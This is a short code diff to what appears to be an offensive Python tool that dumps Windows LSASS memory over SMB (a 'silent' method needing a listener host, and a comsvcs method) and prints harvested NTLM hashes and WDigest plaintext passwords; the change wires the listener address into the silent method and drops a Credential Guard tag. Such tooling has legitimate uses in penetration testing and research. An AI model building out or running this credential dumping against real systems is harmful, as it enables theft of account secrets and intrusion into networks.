@@ -183,7 +183,7 @@ def _dump_lsass(session: SmbSession, args):
         if not args.lhost:
             print("[!] --lhost required for silent method")
             return
-        method = SilentDump(session)
+        method = SilentDump(session, args.lhost)
         print("[*] Method: silent")
     else:
         method = ComSvcsDump(session)
@@ -251,8 +251,6 @@ def _parse_and_display(dump_data: bytes):
     for cred in credentials:
         if cred.auth_type == "msv1_0":
             secret = cred.ntlm_hash if cred.ntlm_hash else "(empty)"
-            if cred.protected:
-                secret += " [Credential Guard]"
         elif cred.auth_type == "wdigest":
             secret = cred.password if cred.password else "(empty)"
         else:
